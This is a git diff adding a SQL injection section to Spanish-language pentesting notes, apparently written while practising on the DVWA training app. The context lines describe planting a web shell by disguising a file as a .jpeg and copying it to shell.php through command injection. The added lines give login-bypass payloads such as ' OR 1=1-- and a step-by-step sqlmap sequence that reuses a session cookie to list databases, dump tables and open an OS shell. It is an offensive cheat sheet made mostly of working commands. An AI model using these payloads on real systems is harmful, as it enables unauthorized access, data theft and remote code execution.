@@ -225,3 +225,30 @@ En nivel MEDIO se hace el mismo procedimiento, a diferencia de que se crea un ar
 
 En nivel ALTO se hace el mismo procedimiento pero se guarda el archivo pluma como .jpeg y se agrega en la primera linea GIF98, luego en la seccion de Command Injection de DVWA se coloca: | copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php (simplemente se copia el archivo cambiandole el nombre y extension) 
 ```
+## SQLi
+**Authentication Bypass**
+```
+'-- (en el campo de usuario y se coloca cualquier cosa en contrasena)
+[cualquier username]' OR 1=1-- 
+```
+IDOR --> Luego del authentication bypass o del login, ir iterando hasta conseguir el dato solicitado.
+**SQLmap**
+```
+En "Inspeccionar" en el navegador, en la pestana "Console" se escribe document.cookie
+Ahora se ejecuta SQLmap con esa cookie:
+
+CHEQUEA LA BASE DE DATOS
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" --dbs
+
+CHEQUEA LAS TABLAS DE LA BASE DE DATOS
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] --tables
+
+CHEQUEA LAS COLUMNAS DE LA TABLA
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] -T [target_Table] --columns
+
+DUMPEAR TODOS LOS VALORES DE LA TABLA
+sqlmap -u "http://domain.com/path.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" -D [database_name] -T [target_Table] --dump
+
+PARA OBTENER LA OS SHELL
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low" --os-shell
+```
